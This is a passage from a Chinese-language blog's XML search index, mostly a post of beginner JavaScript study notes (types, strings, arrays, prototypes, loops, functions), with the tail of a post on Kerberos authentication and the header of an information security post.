src="/2023/11/03/%E9%89%B4%E5%88%AB%E6%9C%BA%E5%88%B6%E5%92%8C%E6%8A%80%E6%9C%AF/image-20231110085828190.png" alt="image-20231110085828190"></p><h2 id="4-Kerberos鉴别协议——单点登陆系统"><a href="#4-Kerberos鉴别协议——单点登陆系统" class="headerlink" title="4.Kerberos鉴别协议——单点登陆系统"></a>4.Kerberos鉴别协议——单点登陆系统</h2><ul><li><h3 id="提供的能力："><a href="#提供的能力：" class="headerlink" title="提供的能力："></a>提供的能力：</h3><ul><li>鉴别、记账、审计</li><li>基于对称密钥算法</li></ul></li><li><h3 id="前提条件："><a href="#前提条件：" class="headerlink" title="前提条件："></a>前提条件：</h3><ul><li><img src="/2023/11/03/%E9%89%B4%E5%88%AB%E6%9C%BA%E5%88%B6%E5%92%8C%E6%8A%80%E6%9C%AF/image-20231110091309417.png" alt="image-20231110091309417"></li><li><img src="/2023/11/03/%E9%89%B4%E5%88%AB%E6%9C%BA%E5%88%B6%E5%92%8C%E6%8A%80%E6%9C%AF/image-20231110091908161.png" alt="image-20231110091908161"></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 安全知识，网安技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 身份鉴别 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Js语法</title>
      <link href="/2023/11/01/Js%E8%AF%AD%E6%B3%95/"/>
      <url>/2023/11/01/Js%E8%AF%AD%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<blockquote><p>node桌面版的js，不只网页</p><p>ECMAScript：语法啊</p><p>BOM、DOM：API；JQuery：屏蔽各个浏览器差异</p></blockquote><h1 id="ECMAScript"><a href="#ECMAScript" class="headerlink" title="ECMAScript"></a>ECMAScript</h1><ul><li><p>JS在网页中嵌入时，嵌入在ｂｏｄｙ的最下方</p></li><li><p>变量赋值：</p><ul><li>引用式赋值——ａ＝ｂ（ａ的位置打了一个ｂ的标签，没有新的内存空间开辟）</li><li>变量开头——＿＼＄和字符打头，匈牙利命名</li><li>变量名区分大小写、变量名区分大小写</li></ul></li><li><p>变量类型</p><ul><li><p>Ｓｔｒｉｎｇ</p></li><li><p>Ｎｕｍｂｅｒ：数值</p></li><li><p>Ｂｏｏｌｅａｎ</p></li><li><p>Ａｒｒａｙ：对内元素无要求</p></li><li><p>Ｏｂｊｅｃｔ</p></li><li><p>NULL</p></li><li><p>Undefined</p></li><li><p><img src="/2023/11/01/Js%E8%AF%AD%E6%B3%95/image-20231101202157321.png" alt="image-20231101202157321"></p></li><li><p>Number、ParseInt、toString方法</p></li><li><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> width=<span class="number">12.5</span>;</span><br><span class="line"><span class="keyword">var</span> height=<span class="number">24.5</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">typeof</span> width);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> str;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str + width);<span class="comment">//nan</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> str1=width.<span class="title function_">toString</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str1,<span class="keyword">typeof</span> str1);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> str2=<span class="string">&#x27;3.1415826&#x27;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str2+width);<span class="comment">//字符串拼接</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="built_in">parseFloat</span>(str2)*width*<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> str3=<span class="string">&quot;3.1234slong&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> str5=<span class="string">&quot;3.1415926&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> str4=<span class="title class_">Number</span>(str3);<span class="comment">//结果NAN，使用number必须只能有数值</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str4);</span><br><span class="line"><span class="keyword">var</span> str6=<span class="title class_">Number</span>(str5);<span class="comment">//结果3.1415926</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p>字符串</p><ul><li><p>定义</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 第一种方式:基本方式</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> str1=<span class="string">&#x27;long time no see!&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> str2=<span class="string">&quot;nice to meet u!&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第二种方式：字符串中包含特殊字符</span></span><br><span class="line"><span class="keyword">var</span> str3=<span class="string">&#x27;great man tolds us:&quot;Imperialism is all paper tigers.&quot;&#x27;</span>;<span class="comment">//取反</span></span><br><span class="line"><span class="keyword">var</span> str4=<span class="string">&quot;great man tolds us:&#x27;Imperialism is all paper tigers.&#x27;&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> str5=<span class="string">&quot;great man told us: \&quot;Imperialism is all paper tigers.\&quot; &quot;</span>;<span class="comment">//转义</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;str1:&quot;</span> + str1);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;str2:&quot;</span> + str2);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;str3:&quot;</span> + str3);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;str4:&quot;</span> + str4);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;str5:&quot;</span> + str5);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第三种字符串模版：多行字符串</span></span><br><span class="line"><span class="keyword">var</span> str6=<span class="string">`long long ago,</span></span><br><span class="line"><span class="string">there lived a beautiful girl named Snowwhite.</span></span><br><span class="line"><span class="string">Snowwhite is very beautiful,but she is very unlucky.</span></span><br><span class="line"><span class="string">Because her mother had gong since she was a very little girl.</span></span><br><span class="line"><span class="string">`</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;str6:&quot;</span>+str6);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第四种字符串：字符串模版 `$&#123;字符串模版&#125;`</span></span><br><span class="line"><span class="keyword">var</span> name =<span class="string">&quot;Gang Liang&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> sex=<span class="string">&quot;Male&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> age=<span class="number">25</span>;</span><br><span class="line">temple=<span class="string">`<span class="subst">$&#123;name&#125;</span> is <span class="subst">$&#123;sex&#125;</span> and he is <span class="subst">$&#123;age&#125;</span> years old!`</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;temple：&quot;</span>+temple);</span><br></pre></td></tr></table></figure></li><li><p>属性与方法：</p></li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 在js中所有事物都是对象，字符串也不例外，字符串常见的属性与方法如下</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> str=<span class="string">&quot;Gang Liang&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;str&#x27; length:&quot;</span>,str.<span class="property">length</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;element for str[2]:&quot;</span>,str[<span class="number">2</span>]);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;upper case str:&quot;</span>,str.<span class="title function_">toUpperCase</span>());</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;lower case str:&quot;</span>,str.<span class="title function_">toLowerCase</span>());</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;position for substr:&quot;</span>,str.<span class="title function_">indexOf</span>(<span class="string">&quot;Liang&quot;</span>));<span class="comment">//首个</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;position for substr:&quot;</span>,str.<span class="title function_">indexOf</span>(<span class="string">&quot;liang&quot;</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;get substr from str:&quot;</span>,str.<span class="title function_">substring</span>(<span class="number">3</span>,<span class="number">6</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2023/11/01/Js%E8%AF%AD%E6%B3%95/image-20231101204319124.png" alt="image-20231101204319124"></p></li><li><p>；：不是强制的</p></li><li><p>数组</p><ul><li>定义</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 在js中数组的定义和赋值有三种方式</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 方式1：先创建数组，然后赋值</span></span><br><span class="line"><span class="keyword">var</span> item=<span class="keyword">new</span> <span class="title class_">Array</span>();</span><br><span class="line">item[<span class="number">0</span>]=<span class="string">&quot;pear&quot;</span>;</span><br><span class="line">item[<span class="number">1</span>]=<span class="number">35</span>;</span><br><span class="line">item[<span class="number">2</span>]=<span class="string">&quot;banana&quot;</span></span><br><span class="line">item[<span class="number">3</span>]=<span class="number">60</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;item:&quot;</span>,item);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 方式2：创建数组的同时，同时创建数组,类似构造函数传入参数</span></span><br><span class="line"><span class="keyword">var</span> student=<span class="keyword">new</span> <span class="title class_">Array</span>(<span class="string">&#x27;张三&#x27;</span>,<span class="string">&#x27;李四&#x27;</span>,<span class="string">&#x27;王麻子&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;students:&quot;</span>,student);</span><br><span class="line"></span><br><span class="line"><span class="comment">//方式3：c语言数组定义与初始化方式</span></span><br><span class="line"><span class="keyword">var</span> example=[<span class="string">&#x27;Beijing&#x27;</span>,<span class="string">&quot;Shanghai&quot;</span>,<span class="string">&quot;Shenzhen&quot;</span>,<span class="string">&quot;Guanzhou&quot;</span>,<span class="string">&quot;Chengdu&quot;</span>];</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;example:&quot;</span>,example);</span><br></pre></td></tr></table></figure><ul><li>方法：</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 同样数组也是对象，也包含对应的属性与方法</span></span><br><span class="line"><span class="comment">// 字符串的大部分属性和方法，数组也有。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义数组</span></span><br><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3.14</span>, <span class="string">&#x27;Hello&#x27;</span>, <span class="literal">null</span>, <span class="literal">true</span>,<span class="number">3.14</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 复习基本属性</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;length for array:&quot;</span>,arr.<span class="property">length</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;the nth element for array:&quot;</span>,arr[<span class="number">3</span>]);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;exceed the range:&quot;</span>,arr[<span class="number">13</span>]);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;position for element:&quot;</span>,arr.<span class="title function_">indexOf</span>(<span class="number">3.14</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 新的属性与方法</span></span><br><span class="line"><span class="comment">// slice()获取子串</span></span><br><span class="line"><span class="keyword">var</span> substr1=arr.<span class="title function_">slice</span>(<span class="number">4</span>,<span class="number">6</span>);<span class="comment">//左闭右开</span></span><br><span class="line"><span class="keyword">var</span> substr2=arr.<span class="title function_">slice</span>(<span class="number">2</span>);</span><br><span class="line"><span class="keyword">var</span> substr3=arr.<span class="title function_">slice</span>();<span class="comment">//等同于拷贝</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;substr1:&quot;</span>,substr1);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;substr2:&quot;</span>,substr2);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;substr3&quot;</span>,substr3);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 数组元素的增加与删除</span></span><br><span class="line"><span class="comment">// 有两种方式：1.从尾部增加删除：push pop;2.从头部增加删除:unshift,shift</span></span><br><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>, <span class="number">2</span>];</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;before adding:&quot;</span>,arr);</span><br><span class="line">arr.<span class="title function_">push</span>(<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>); </span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;after adding:&quot;</span>,arr);</span><br><span class="line"><span class="keyword">var</span> ret=arr.<span class="title function_">pop</span>(); <span class="comment">// pop()返回&#x27;B&#x27;</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;pop value:&quot;</span>,ret);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;after pop:&quot;</span>,arr);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;the sec way for adding element:&quot;</span>);</span><br><span class="line">arr.<span class="title function_">unshift</span>(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;b&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;adding in the head&quot;</span>,arr);</span><br><span class="line">arr.<span class="title function_">shift</span>(<span class="string">&quot;a&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;remove the element from the head&quot;</span>,arr);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对元素进行排序:sort(),支持数组原地转换</span></span><br><span class="line">arr.<span class="title function_">sort</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;original arr:&quot;</span>,arr);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 反序排列数组</span></span><br><span class="line">arr.<span class="title function_">reverse</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;reversed arr&quot;</span>,arr);</span><br><span class="line"></span><br><span class="line"><span class="comment">// splice:从指定位置删除元素并增加元素</span></span><br><span class="line"><span class="keyword">var</span> arr = [<span class="string">&#x27;Microsoft&#x27;</span>, <span class="string">&#x27;Apple&#x27;</span>, <span class="string">&#x27;Yahoo&#x27;</span>, <span class="string">&#x27;AOL&#x27;</span>, <span class="string">&#x27;Excite&#x27;</span>, <span class="string">&#x27;Oracle&#x27;</span>];</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;before change:&quot;</span>,arr);</span><br><span class="line"><span class="comment">// 从索引2开始删除3个元素,然后再添加两个元素:</span></span><br><span class="line"><span class="keyword">var</span> ret=arr.<span class="title function_">splice</span>(<span class="number">2</span>, <span class="number">3</span>, <span class="string">&#x27;Google&#x27;</span>, <span class="string">&#x27;Facebook&#x27;</span>); <span class="comment">// 返回删除的元素 [&#x27;Yahoo&#x27;, &#x27;AOL&#x27;, &#x27;Excite&#x27;]</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;return value:&quot;</span>,ret);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;the changed arr:&quot;</span>,arr);</span><br><span class="line"><span class="comment">// 只删除,不添加,只给删除的启始位置，和删除元素个数</span></span><br><span class="line"><span class="keyword">var</span> ret=arr.<span class="title function_">splice</span>(<span class="number">2</span>, <span class="number">2</span>); <span class="comment">// [&#x27;Google&#x27;, &#x27;Facebook&#x27;];</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;reture value:&quot;</span>,ret);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;the changed arr:&quot;</span>,arr);</span><br><span class="line"><span class="comment">// 只添加,不删除:</span></span><br><span class="line">arr.<span class="title function_">splice</span>(<span class="number">2</span>, <span class="number">0</span>, <span class="string">&#x27;Google&#x27;</span>, <span class="string">&#x27;Facebook&#x27;</span>); <span class="comment">// 返回[],因为没有删除任何元素</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;the changed arr:&quot;</span>,arr);</span><br><span class="line"></span><br><span class="line"><span class="comment">// concat():连接两个数组</span></span><br><span class="line"><span class="keyword">var</span> arr = [<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>];</span><br><span class="line"><span class="keyword">var</span> added = arr.<span class="title function_">concat</span>([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;the return arr:&quot;</span>,added);</span><br><span class="line"></span><br><span class="line"><span class="comment">// join:将数组中的各个元素使用指定的字符连接起来</span></span><br><span class="line"><span class="keyword">var</span> arr = [<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="keyword">var</span> ret=arr.<span class="title function_">join</span>(<span class="string">&#x27; &#x27;</span>); </span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(ret);</span><br><span class="line"><span class="keyword">var</span> ret1=arr.<span class="title function_">join</span>(<span class="string">&#x27;*&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(ret1);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>对象</p><ul><li><p>面向原型编程</p></li><li><pre><code class="JS">// 基于原型的概念：基于一个实在的对象产生新的对象// 已经存在一个实例对象//大括号+键值对var student=&#123;  name:&#39;ZhangSan&#39;,  sex: &quot;male&quot;,  run:function()&#123;    console.log(`$&#123;this.name&#125; is $&#123;this.sex&#125;`);  &#125;&#125;;var Club=&#123;  dance:function()&#123;    console.log(`$&#123;this.name&#125; is dancing!`);  &#125;&#125;;var si=&#123;  name:&quot;Lisi&quot;,  sex:&quot;femaile&quot;&#125;si.__proto__=student;si.run();si.__proto__=Club;si.dance();// si.run();<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">```JS</span><br><span class="line">// 创建一个工厂函数创建对象</span><br><span class="line">function creatPerson(myname,mysex,myage)&#123;</span><br><span class="line">  var person=new Object();</span><br><span class="line">  person.name=myname;</span><br><span class="line">  person.sex=mysex;</span><br><span class="line">  person.age=myage;</span><br><span class="line">  person.say=function()&#123;</span><br><span class="line">    console.log(`$&#123;this.name&#125; is $&#123;this.sex&#125; and he is $&#123;this.age&#125; years old`);</span><br><span class="line">  &#125;</span><br><span class="line">  // 将对象返回回去</span><br><span class="line">  return person;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var gang=creatPerson(&quot;Gang Liang&quot;,&quot;Male&quot;,25);</span><br><span class="line">var san=creatPerson(&quot;Zhang San&quot;,&quot;female&quot;,21);</span><br><span class="line">var si=creatPerson(&quot;Li si&quot;,&quot;Male&quot;,18);</span><br><span class="line">gang.say();</span><br><span class="line">san.say();</span><br><span class="line">si.say();</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 先创建对象，然后对对象初始化</span></span><br><span class="line"><span class="keyword">var</span> person=<span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">person.<span class="property">name</span>=<span class="string">&quot;Gang Liang&quot;</span>;</span><br><span class="line">person.<span class="property">sex</span>=<span class="string">&quot;male&quot;</span>;</span><br><span class="line">person.<span class="property">age</span>=<span class="number">25</span>;</span><br><span class="line">person.<span class="property">say</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.name&#125;</span> is <span class="subst">$&#123;<span class="variable language_">this</span>.sex&#125;</span> and he is <span class="subst">$&#123;<span class="variable language_">this</span>.age&#125;</span> years old`</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">person.<span class="title function_">say</span>();</span><br><span class="line">person.<span class="property">hometown</span>=<span class="string">&quot;Chengdu&quot;</span>;<span class="comment">//动态新增属性</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(person.<span class="property">hometown</span>);</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建构造函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Person</span>(<span class="params">myname,mysex,myage</span>)&#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">name</span>=myname;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">sex</span>=mysex;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">age</span>=myage;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">say</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.name&#125;</span> is <span class="subst">$&#123;<span class="variable language_">this</span>.sex&#125;</span> and he is <span class="subst">$&#123;<span class="variable language_">this</span>.age&#125;</span> years old`</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> gang=<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Gang Liang&quot;</span>,<span class="string">&quot;Male&quot;</span>,<span class="number">25</span>);</span><br><span class="line"><span class="keyword">var</span> san=<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Zhang San&quot;</span>,<span class="string">&quot;Female&quot;</span>,<span class="number">21</span>);</span><br><span class="line"><span class="keyword">var</span> si=<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Li Si&quot;</span>,<span class="string">&quot;Male&quot;</span>,<span class="number">18</span>);</span><br><span class="line">gang.<span class="title function_">say</span>();</span><br><span class="line">san.<span class="title function_">say</span>();</span><br><span class="line">si.<span class="title function_">say</span>();</span><br></pre></td></tr></table></figure></code></pre></li></ul></li><li><p>loop</p><ul><li>迭代方式：</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// for...in, 遍历对象的属性</span></span><br><span class="line"><span class="keyword">var</span> obj= &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;Jack&#x27;</span>,</span><br><span class="line">  <span class="attr">age</span>: <span class="number">20</span>,</span><br><span class="line">  <span class="attr">city</span>: <span class="string">&#x27;Beijing&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取属性</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> key <span class="keyword">in</span> obj) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(key); <span class="comment">// &#x27;name&#x27;, &#x27;age&#x27;, &#x27;city&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> cities = [<span class="string">&#x27;Beijing&#x27;</span>, <span class="string">&#x27;Shanghai&#x27;</span>, <span class="string">&#x27;Chengdu&#x27;</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> index <span class="keyword">in</span> cities) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(index); </span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(cities[index]); </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// for ... of (iterabel)</span></span><br><span class="line"><span class="keyword">for</span>(city <span class="keyword">of</span> cities)</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(city);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> str=<span class="string">&quot;long time no see&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (char <span class="keyword">of</span> str)</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(char);</span><br><span class="line"></span><br><span class="line"><span class="comment">// break and continue</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> count=<span class="number">1</span>; count&lt;=<span class="number">10</span>;count++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (count%<span class="number">3</span>==<span class="number">0</span>)</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;break:&quot;</span>,count);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> count=<span class="number">1</span>; count&lt;=<span class="number">10</span>;count++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (count%<span class="number">3</span>==<span class="number">0</span>)</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;continue:&quot;</span>,count);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>函数</p><ul><li><pre><code class="JS">// 方式1： function(arguments)&#123;sentences;return ret;&#125;function abs(x)&#123;  if (typeof x==&quot;number&quot;)    if(x&gt;0)      return x;    else      return -x;&#125;console.log(abs(-3));// 方式2：匿名函数var func=function(x)&#123;  if (typeof x==&quot;number&quot;)    if(x&gt;0)      return x;    else      return -x;&#125;console.log(func(-4));// 方式3：箭头函数var func1=(x,y) =&gt; &#123;  if (x&gt;y)    return x;  else    return y;&#125;console.log(func1(234,567));<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- 剩余</span><br><span class="line"></span><br><span class="line">​</span><br><span class="line"></span><br><span class="line">```JS</span><br><span class="line">function sum(x,y)&#123;</span><br><span class="line">  console.log(&quot;x:&quot;,x);</span><br><span class="line">  console.log(&quot;y:&quot;,y);</span><br><span class="line">  return x+y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">console.log(sum(3,2));</span><br><span class="line">console.log(sum(3));</span><br><span class="line">console.log(sum(3,4,5,6,7));</span><br><span class="line"></span><br><span class="line">//arguments:一个数组变量存储了所有参数； </span><br><span class="line">function sum1(x,y)</span><br><span class="line">&#123;</span><br><span class="line">  console.log(&quot;x:&quot;,x);</span><br><span class="line">  console.log(&quot;y:&quot;,y);</span><br><span class="line">  for (var value of arguments)</span><br><span class="line">    console.log(value);</span><br><span class="line">  return x+y;</span><br><span class="line">&#125;</span><br><span class="line">console.log(sum1(3,4,5,6,7));</span><br><span class="line"></span><br><span class="line">//rest:用户获取没有使用的参数</span><br><span class="line"></span><br><span class="line">function sum1(x,y,...rest)</span><br><span class="line">&#123;</span><br><span class="line">  console.log(&quot;x:&quot;,x);</span><br><span class="line">  console.log(&quot;y:&quot;,y);</span><br><span class="line">  for (var value of rest)</span><br><span class="line">    console.log(value);</span><br><span class="line">  return x+y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></code></pre></li></ul></li><li><p>作用域</p></li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 在js中变量的作用域分为全局作用域、局部作用域和块级作用域</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 全局作用域：在函数外边定义的变量，或者没有使用var 定义的变量</span></span><br></pre></td></tr></table></figure><p>- </p><h1 id="BOM"><a href="#BOM" class="headerlink" title="BOM"></a>BOM</h1><h1 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h1>]]></content>
      
      
      <categories>
          
          <category> 技术栈学习 </category>
          
          <category> web应用开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息安全技术</title>
      <link href="/2023/10/23/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/"/>
      <url>/2023/10/23/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/</url>
      
